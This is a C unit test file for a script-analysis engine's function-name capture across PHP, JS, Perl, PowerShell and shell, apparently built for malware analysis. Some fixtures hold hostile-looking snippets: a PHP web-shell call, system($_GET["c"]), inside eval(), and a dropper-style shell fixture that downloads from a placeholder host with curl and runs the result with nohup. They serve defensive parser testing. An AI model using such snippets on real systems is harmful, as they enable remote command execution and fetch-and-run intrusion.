/*
 * script_funcs - kgenome_script_funcs_build's NAME capture (struct kgenome_func.name_off/name_len,
 * genotype/image/funcs.h). Oracle: each language's shape-matcher already walks past the identifier
 * between its keyword and its parameter list, captured where it is already found - no second scan
 * of the text, no copy of the bytes. Linked against libkgenome.a alone (the builder takes nothing
 * but a buffer).
 *
 * This is the RED test for the owner's task ("nối block trong mutations voi lai hien thi ham trong
 * engine cho scripting languages"): before this patch struct kgenome_func had no name field at all,
 * so a script function was NEVER distinguishable from one with no name here. tests/unit/
 * mutation_units.c's script_functions() is the end-to-end half (it already builds a realistic PHP
 * fixture and checks kgenome_script_funcs_build's units; this file adds the name assertions at the
 * lib level and the hostile/boundary cases a lib-only test can run without the engine).
 *
 * MULTI-LANGUAGE (owner, 2026-11-06, the follow-up task: "ap dung vao engine va dam bao co hien thi
 * trong mutation block" for every language that can have code outside a function - the PHP-only
 * half of script_funcs.c widened to JS, perl, shell and powershell, the brace-delimited family):
 * the several_named_functions/anonymous/hostile/truncated group below is run once per added
 * language, mirroring the PHP cases this file already had rather than inventing a new shape per
 * language; shell gets its own extra cases (both of its two declaration shapes in one file, and the
 * call-is-not-a-declaration check the owner's own brief asked for by name).
 */
#include <kgenome.h>
#include <string.h>

#include "hk.h"

/* The identifier at fs.v[i]'s name span, as a NUL-terminated C string - the test's own helper, not
 * the product: kof_func_name (the engine) is what a real consumer calls, and that is exercised in
 * tests/unit/mutation_units.c (the lib alone cannot link it). */
static const char *name_of(const char *src, const struct kgenome_func *f, char *buf, size_t cap)
{
	size_t n = f->name_len < cap - 1u ? f->name_len : cap - 1u;

	memcpy(buf, src + f->name_off, n);
	buf[n] = 0;
	return buf;
}

/* Every entry's name span lies inside the buffer the table was built from - checked over every
 * table this file builds, not just one: a span escaping [0, data_n) would be a real
 * out-of-bounds read the day something finally reads it (kof_func_name does, in sym_any.c). */
static void bounds_ok(const struct kgenome_func_set *fs, uint64_t data_n)
{
	uint32_t i;

	for (i = 0; i < fs->n; i++) {
		const struct kgenome_func *f = &fs->v[i];
		int off_ok = f->name_off <= data_n;

		CK(off_ok);
		if (off_ok)
			CK((uint64_t)f->name_len <= data_n - f->name_off);
	}
}

static void several_named_functions(void)
{
	static const char php[] =
		"<?php\n"
		"function alpha($a) {\n"
		"  return $a;\n"
		"}\n"
		"function beta($b) {\n"
		"  return $b * 2;\n"
		"}\n"
		"function gamma() {\n"
		"  return 3;\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 3u);
	if (fs.n == 3u) {
		/* Each function keeps its OWN name, not the first one's or the last one's: a bug that
		 * only ever captured the first "function" keyword's name, or that let a later entry's
		 * name_off leak into an earlier one, would show up here and nowhere in a one-function
		 * fixture. */
		CK(fs.v[0].name_len == 5u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "alpha"));
		CK(fs.v[1].name_len == 4u && !strcmp(name_of(php, &fs.v[1], nm, sizeof nm), "beta"));
		CK(fs.v[2].name_len == 5u && !strcmp(name_of(php, &fs.v[2], nm, sizeof nm), "gamma"));
	}
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

static void by_reference_return_skips_the_ampersand(void)
{
	static const char php[] = "<?php\nfunction &getRef() {\n  return $GLOBALS['x'];\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 6u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "getRef"));
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* ANONYMOUS CLOSURE: "function (...) {...}" with no identifier is valid PHP (an expression, not a
 * declaration statement) - function_shape() finds a shape (params, body) but no name, so name_len
 * must be exactly 0: the same "no name" kof_func_name reads as block_<line> (sym_any.c,
 * 2026-11-06), never the binary's own fcn_<offset> fallback. */
static void anonymous_closure_has_no_name(void)
{
	static const char php[] = "<?php\n$f = function ($a) {\n  return $a + 1;\n};\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/*
 * HOSTILE: a name shape PHP itself would refuse to parse ("123_bad" cannot start an identifier in
 * real PHP) is not rejected by is_ident() here (it has no "not a digit first" rule, the same
 * leniency the rest of this file already has for malformed input) - captured as ordinary bytes,
 * never out of bounds and never a crash. The point of this case is not "123_bad is the right name";
 * it is that a shape nothing here validates cannot corrupt the span or the table.
 */
static void hostile_name_starting_with_a_digit(void)
{
	static const char php[] = "<?php\nfunction 123_bad() {\n  return 1;\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK(fs.v[0].name_len == 7u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "123_bad"));
	}
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* TRUNCATED: a function whose body never closes still carries its name (the pending stack's own
 * name_off/name_len, not re-derived) - the open-ended path (script_funcs.c's done_scan loop) must
 * copy the name exactly as the closed-body path does. */
static void truncated_function_keeps_its_name(void)
{
	static const char php[] = "<?php\nfunction notClosed($a) {\n  return $a;\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK((fs.v[0].flags & KGENOME_FN_F_END_OPEN) != 0);
		CK(fs.v[0].name_len == 9u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "notClosed"));
	}
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* NESTING: the dedup keeps the OUTER function as the one surviving unit (mutation_units.c's
 * script_functions() already pins this for off/len/kind); this pins that the surviving entry's
 * name is the OUTER's own, never the inner's - a dedup that copied the wrong struct, or that kept
 * the inner by mistake, would show a name of "inner" here instead of "outer". */
static void nesting_keeps_the_outer_name(void)
{
	static const char php[] =
		"<?php\n"
		"function outer($x) {\n"
		"  function inner($y) { return $y * 2; }\n"
		"  return inner($x);\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 5u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "outer"));
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* An ELF/PE builder never sets name_off/name_len - checked directly rather than assumed: a
 * kgenome_func a caller zeroed (every builder in this tree does) answers 0/0, which is exactly
 * "no name" and not a sentinel that could collide with a real offset of 0. */
static void zeroed_entry_has_no_name(void)
{
	struct kgenome_func f;

	memset(&f, 0, sizeof f);
	CK(f.name_off == 0u && f.name_len == 0u);
}

/* ============================= JS ============================= */

static void js_several_named_functions(void)
{
	static const char js[] =
		"function alpha(x, y) {\n"
		"  return x ^ y;\n"
		"}\n"
		"function* beta(n) {\n"
		"  yield n;\n"
		"}\n"
		"function gamma() {\n"
		"  return 3;\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_JS, (const uint8_t *)js, sizeof js - 1u, &fs);
	CK(fs.n == 3u);
	if (fs.n == 3u) {
		CK(fs.v[0].name_len == 5u && !strcmp(name_of(js, &fs.v[0], nm, sizeof nm), "alpha"));
		/* the generator's "*" is skipped, not part of the name */
		CK(fs.v[1].name_len == 4u && !strcmp(name_of(js, &fs.v[1], nm, sizeof nm), "beta"));
		CK(fs.v[2].name_len == 5u && !strcmp(name_of(js, &fs.v[2], nm, sizeof nm), "gamma"));
	}
	bounds_ok(&fs, sizeof js - 1u);
	kgenome_funcs_free(&fs);
}

/* A function EXPRESSION, `function (x) {...}` with no identifier, is valid JS (assigned to a
 * variable) - the JS analogue of PHP's anonymous closure case. */
static void js_function_expression_has_no_name(void)
{
	static const char js[] = "var f = function (a) {\n  return a + 1;\n};\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_JS, (const uint8_t *)js, sizeof js - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 0u);
	bounds_ok(&fs, sizeof js - 1u);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: a "function" that only occurs inside a string literal must not be mistaken for a real
 * declaration - the SAME is_code bitmap mechanism PHP's own tests already rely on (the lexer, not
 * this file, tells code from string); and an unterminated function body is still captured, named,
 * and flagged END_OPEN rather than dropped or crashed on. */
static void js_keyword_in_a_string_is_not_a_function(void)
{
	static const char js[] = "var s = \"function fake() {}\";\nfunction real() {\n  return 1;\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_JS, (const uint8_t *)js, sizeof js - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(js, &fs.v[0], nm, sizeof nm), "real"));
	bounds_ok(&fs, sizeof js - 1u);
	kgenome_funcs_free(&fs);
}

static void js_truncated_function_keeps_its_name(void)
{
	static const char js[] = "function notClosed(a) {\n  return a;\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_JS, (const uint8_t *)js, sizeof js - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK((fs.v[0].flags & KGENOME_FN_F_END_OPEN) != 0);
		CK(fs.v[0].name_len == 9u && !strcmp(name_of(js, &fs.v[0], nm, sizeof nm), "notClosed"));
	}
	bounds_ok(&fs, sizeof js - 1u);
	kgenome_funcs_free(&fs);
}

/* ============================ PERL ============================ */

static void perl_several_named_functions(void)
{
	static const char pl[] =
		"sub alpha {\n"
		"  return shift;\n"
		"}\n"
		"sub beta($$) {\n"
		"  return $_[0] + $_[1];\n"
		"}\n"
		"sub gamma() {\n"
		"  return 3;\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PERL, (const uint8_t *)pl, sizeof pl - 1u, &fs);
	CK(fs.n == 3u);
	if (fs.n == 3u) {
		CK(fs.v[0].name_len == 5u && !strcmp(name_of(pl, &fs.v[0], nm, sizeof nm), "alpha"));
		/* the "($$)" prototype is balanced and skipped, never inspected */
		CK(fs.v[1].name_len == 4u && !strcmp(name_of(pl, &fs.v[1], nm, sizeof nm), "beta"));
		CK(fs.v[2].name_len == 5u && !strcmp(name_of(pl, &fs.v[2], nm, sizeof nm), "gamma"));
	}
	bounds_ok(&fs, sizeof pl - 1u);
	kgenome_funcs_free(&fs);
}

/* A bare `sub {...}` with no name is a real anonymous closure (perlsub(1)), perl's analogue of
 * PHP's anonymous closure and JS's function expression. */
static void perl_anonymous_sub_has_no_name(void)
{
	static const char pl[] = "my $f = sub {\n  return 1;\n};\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PERL, (const uint8_t *)pl, sizeof pl - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 0u);
	bounds_ok(&fs, sizeof pl - 1u);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: a forward declaration (`sub foo($$);`, no body - this tree's own RandPasswd.pm sample
 * has several) must not be matched as a function at all - it ends in ";", not "{". */
static void perl_forward_declaration_is_not_a_function(void)
{
	static const char pl[] = "sub foo($$);\nsub bar {\n  return 1;\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PERL, (const uint8_t *)pl, sizeof pl - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 3u && !strcmp(name_of(pl, &fs.v[0], nm, sizeof nm), "bar"));
	bounds_ok(&fs, sizeof pl - 1u);
	kgenome_funcs_free(&fs);
}

static void perl_truncated_function_keeps_its_name(void)
{
	static const char pl[] = "sub notClosed {\n  return 1;\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PERL, (const uint8_t *)pl, sizeof pl - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK((fs.v[0].flags & KGENOME_FN_F_END_OPEN) != 0);
		CK(fs.v[0].name_len == 9u && !strcmp(name_of(pl, &fs.v[0], nm, sizeof nm), "notClosed"));
	}
	bounds_ok(&fs, sizeof pl - 1u);
	kgenome_funcs_free(&fs);
}

/* =========================== POWERSHELL ========================== */

static void psh_several_named_functions(void)
{
	static const char ps[] =
		"function Alpha($x) {\n"
		"    return $x\n"
		"}\n"
		"function Beta {\n"
		"    param($y)\n"
		"    return $y\n"
		"}\n"
		"function  Gamma()\n"
		"{\n"
		"    return 3\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PSH, (const uint8_t *)ps, sizeof ps - 1u, &fs);
	CK(fs.n == 3u);
	if (fs.n == 3u) {
		CK(fs.v[0].name_len == 5u && !strcmp(name_of(ps, &fs.v[0], nm, sizeof nm), "Alpha"));
		/* no parens at all: the param(...) block is read as ordinary code inside the body */
		CK(fs.v[1].name_len == 4u && !strcmp(name_of(ps, &fs.v[1], nm, sizeof nm), "Beta"));
		/* two spaces between "function" and the name, and the brace on its own line */
		CK(fs.v[2].name_len == 5u && !strcmp(name_of(ps, &fs.v[2], nm, sizeof nm), "Gamma"));
	}
	bounds_ok(&fs, sizeof ps - 1u);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: "function" inside a comment is not a declaration. */
static void psh_keyword_in_a_comment_is_not_a_function(void)
{
	static const char ps[] = "# function fake { return 0 }\nfunction Real {\n    return 1\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PSH, (const uint8_t *)ps, sizeof ps - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(ps, &fs.v[0], nm, sizeof nm), "Real"));
	bounds_ok(&fs, sizeof ps - 1u);
	kgenome_funcs_free(&fs);
}

static void psh_truncated_function_keeps_its_name(void)
{
	static const char ps[] = "function NotClosed($a) {\n    return $a\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PSH, (const uint8_t *)ps, sizeof ps - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK((fs.v[0].flags & KGENOME_FN_F_END_OPEN) != 0);
		CK(fs.v[0].name_len == 9u && !strcmp(name_of(ps, &fs.v[0], nm, sizeof nm), "NotClosed"));
	}
	bounds_ok(&fs, sizeof ps - 1u);
	kgenome_funcs_free(&fs);
}

/* ============================ SHELL ============================ */

/* BOTH of shell's declaration shapes in the SAME file (owner's brief, explicitly): POSIX's bare
 * `name() { ... }` and bash's `function name { ... }` / `function name() { ... }` - all three
 * found and named correctly, in one pass. */
static void sh_both_shapes_in_one_file(void)
{
	static const char sh[] =
		"get() {\n"
		"    curl $1 > $2\n"
		"}\n"
		"function compile_bot {\n"
		"    gcc -o out bot.c\n"
		"}\n"
		"function deploy()\n"
		"{\n"
		"    get $url $out\n"
		"}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_SH, (const uint8_t *)sh, sizeof sh - 1u, &fs);
	CK(fs.n == 3u);
	if (fs.n == 3u) {
		CK(fs.v[0].name_len == 3u && !strcmp(name_of(sh, &fs.v[0], nm, sizeof nm), "get"));
		CK(fs.v[1].name_len == 11u && !strcmp(name_of(sh, &fs.v[1], nm, sizeof nm), "compile_bot"));
		CK(fs.v[2].name_len == 6u && !strcmp(name_of(sh, &fs.v[2], nm, sizeof nm), "deploy"));
	}
	bounds_ok(&fs, sizeof sh - 1u);
	kgenome_funcs_free(&fs);
}

/*
 * A CALL IS NOT A DECLARATION (owner's brief, explicitly): `get $cc/sys.$(uname -m) $sys` (this
 * tree's own real new_Mirai/ldr.sh calls its "get" function exactly this way, no parens at all)
 * must never be mistaken for a second declaration of "get" - the empty-parens requirement is what
 * tells them apart, and this is the real shape a hostile or merely ordinary dropper script uses.
 */
static void sh_a_call_is_not_mistaken_for_a_declaration(void)
{
	static const char sh[] =
		"get() {\n"
		"    curl $1 > $2\n"
		"}\n"
		"get http://x/y out\n"
		"nohup out &\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_SH, (const uint8_t *)sh, sizeof sh - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 3u && !strcmp(name_of(sh, &fs.v[0], nm, sizeof nm), "get"));
	bounds_ok(&fs, sizeof sh - 1u);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: a non-empty "(...)" after a bare word is NOT a shell function (shell declares no
 * parameter list) - a subshell-like shape must be refused, not mismatched into a declaration with
 * a garbage name/body split. "echo" here is never treated as a function. */
static void sh_non_empty_parens_is_not_a_declaration(void)
{
	static const char sh[] = "echo(hello) { :; }\nfunction real {\n    :\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_SH, (const uint8_t *)sh, sizeof sh - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(sh, &fs.v[0], nm, sizeof nm), "real"));
	bounds_ok(&fs, sizeof sh - 1u);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: "function" inside a single-quoted string is not a declaration - the same is_code
 * mechanism every other language's test above relies on. */
static void sh_keyword_in_a_string_is_not_a_function(void)
{
	static const char sh[] = "echo 'function fake() { }'\nreal() {\n    :\n}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_SH, (const uint8_t *)sh, sizeof sh - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(sh, &fs.v[0], nm, sizeof nm), "real"));
	bounds_ok(&fs, sizeof sh - 1u);
	kgenome_funcs_free(&fs);
}

static void sh_truncated_function_keeps_its_name(void)
{
	static const char sh[] = "notClosed() {\n    echo hi\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_SH, (const uint8_t *)sh, sizeof sh - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u) {
		CK((fs.v[0].flags & KGENOME_FN_F_END_OPEN) != 0);
		CK(fs.v[0].name_len == 9u && !strcmp(name_of(sh, &fs.v[0], nm, sizeof nm), "notClosed"));
	}
	bounds_ok(&fs, sizeof sh - 1u);
	kgenome_funcs_free(&fs);
}

/* ================= EVAL()-LITERAL ISLANDS (PHP only) ================= */

static void eval_literal_function_is_found_and_flagged(void)
{
	/* a mix of quote styles (single outer, double inner) that needs no backslash at all - the
	 * one shape this feature follows (see script_funcs.c's own header) */
	static const char php[] =
		"<?php\n"
		"eval('function helper(){ system($_GET[\"c\"]); } helper(); ');\n";
	struct kgenome_func_set fs;
	const char *at = strstr(php, "function helper");
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u && at) {
		CK(fs.v[0].off == (uint64_t)(at - php));
		CK((fs.v[0].flags & KGENOME_FN_F_EVAL_ISLAND) != 0);
		CK(fs.v[0].name_len == 6u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "helper"));
	}
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) == 0);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* a literal with no function inside it is still merged cleanly: an empty table, not a skip - the
 * owner's own stated case, "code loaded from a string" with nothing declared in it. */
static void eval_literal_with_no_function_merges_cleanly(void)
{
	static const char php[] = "<?php\neval('echo 1; ');\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	/* zero function-like constructs here too (SCRIPTFUNCS-QSORT-1, fixed; see
	 * zero_functions_found_every_language below for the dedicated per-language coverage). */
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) == 0);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: a literal whose own braces do NOT balance must not be merged - forcing it in would
 * desync the shared brace_depth counter for every byte of the script after it. Reported
 * (KGENOME_FNTAB_P_EVAL_SKIP), not silently truncated or mismatched. */
static void eval_literal_unbalanced_braces_is_not_merged(void)
{
	static const char php[] = "<?php\neval('function f(){ ');\nfunction real(){}\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) != 0);
	/* the real, top-level function after the malformed literal is still found: the refusal to
	 * merge the island must not corrupt anything that comes after it */
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "real"));
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* A VARIABLE ARGUMENT is explicitly out of scope: no value flow, no island, no crash. */
static void eval_of_a_variable_is_not_an_island(void)
{
	static const char php[] = "<?php\nfunction real(){}\n$code = get_code();\neval($code);\n";
	struct kgenome_func_set fs;
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u)
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(php, &fs.v[0], nm, sizeof nm), "real"));
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) == 0);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* A DECODE-WRAPPED ARGUMENT is explicitly out of scope: the computed value has no byte range in
 * the object to point at. */
static void eval_of_a_decode_call_is_not_an_island(void)
{
	static const char php[] = "<?php\neval(base64_decode('ZnVuY3Rpb24gZigpe30='));\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* A CONCATENATED ARGUMENT is explicitly out of scope: more than one string, not a bare literal. */
static void eval_of_a_concatenation_is_not_an_island(void)
{
	static const char php[] = "<?php\neval('function '.'f(){}');\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* A SECOND ARGUMENT means the call is not "one bare literal" (assert() historically takes an
 * optional description) - correctly not a match. */
static void eval_of_two_arguments_is_not_an_island(void)
{
	static const char php[] = "<?php\nassert('function f(){}', 'desc');\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* AN ESCAPED LITERAL is out of scope: the raw bytes are not the decoded value, and this file
 * writes no second unescaper (kofeng/CLAUDE.md rule 2) - it only follows the one literal shape
 * whose raw bytes already ARE the value. */
static void eval_of_an_escaped_literal_is_not_an_island(void)
{
	static const char php[] = "<?php\neval('function f(){ echo \\'hi\\'; }');\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* A DOUBLE-QUOTED LITERAL is out of scope even with nothing to interpolate: F_INTERP is a
 * property of the STRING'S KIND, not of its content (textual_span.h), so this file cannot tell a
 * benign double-quoted string apart from one that truly interpolates without decoding it - which
 * is exactly the unescaping this feature declines to do. Named here so the limit is not mistaken
 * for an oversight. */
static void eval_of_a_double_quoted_literal_is_not_an_island(void)
{
	static const char php[] = "<?php\neval(\"function f(){}\");\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)php, sizeof php - 1u, &fs);
	CK(fs.n == 0u);
	bounds_ok(&fs, sizeof php - 1u);
	kgenome_funcs_free(&fs);
}

/* Builds <?php followed by `levels` nested `eval(<<<'Tn' ... Tn);` nowdocs (never escaping: a
 * nowdoc is non-interpolating by KIND and needs no quote character that would collide across
 * levels), innermost holding `inner`. Used by both the "a few levels deep" and the "hostile, past
 * the cap" cases below - one generator, not two. */
static uint64_t build_nested_eval(char *buf, int levels, const char *inner)
{
	int i;
	size_t n = 0;

	n += (size_t)sprintf(buf + n, "<?php\n");
	for (i = 0; i < levels; i++)
		n += (size_t)sprintf(buf + n, "eval(<<<'T%d'\n", i);
	n += (size_t)sprintf(buf + n, "%s\n", inner);
	for (i = levels - 1; i >= 0; i--)
		n += (size_t)sprintf(buf + n, "T%d);\n", i);
	return (uint64_t)n;
}

/* A FEW LEVELS DEEP, well under the cap: the innermost function is still found, flagged, and
 * named - recursion works, not just the first level. */
static void eval_literal_nested_three_levels_finds_the_innermost_function(void)
{
	char buf[1024];
	uint64_t n = build_nested_eval(buf, 3, "function deep(){ return 1; }");
	struct kgenome_func_set fs;
	const char *at = strstr(buf, "function deep");
	char nm[32];

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)buf, n, &fs);
	CK(fs.n == 1u);
	if (fs.n == 1u && at) {
		CK(fs.v[0].off == (uint64_t)(at - buf));
		CK((fs.v[0].flags & KGENOME_FN_F_EVAL_ISLAND) != 0);
		CK(fs.v[0].name_len == 4u && !strcmp(name_of(buf, &fs.v[0], nm, sizeof nm), "deep"));
	}
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) == 0);
	bounds_ok(&fs, n);
	kgenome_funcs_free(&fs);
}

/* HOSTILE: an eval() nested inside an eval() inside an eval()... past EVAL_LIT_DEPTH levels deep -
 * capped and REPORTED (KGENOME_FNTAB_P_EVAL_SKIP), never an infinite loop and never a silent
 * truncation. 12 levels is chosen only to be clearly past whatever the cap is (script_funcs.c's
 * own EVAL_LIT_DEPTH, not exported here) - the function beyond the cap is correctly NOT found,
 * proving the cap really stops the walk and is not just a flag set beside a wrong answer. */
static void eval_literal_depth_cap_is_reported_not_silent(void)
{
	char buf[4096];
	uint64_t n = build_nested_eval(buf, 12, "function deep(){ return 1; }");
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_PHP, (const uint8_t *)buf, n, &fs);
	CK((fs.partial & KGENOME_FNTAB_P_EVAL_SKIP) != 0);
	CK(fs.n == 0u);
	bounds_ok(&fs, n);
	kgenome_funcs_free(&fs);
}

/* A NON-PHP LANGUAGE IS UNAFFECTED, byte for byte: the SAME eval()-of-a-literal-function shape in
 * JS is not followed into an island - js's own nucleo table also names "eval"
 * (nucleo_names_js.c), so this is the language gate in kgenome_script_funcs_build itself being
 * exercised, not merely "no PHP table entry". The function inside the string stays invisible, the
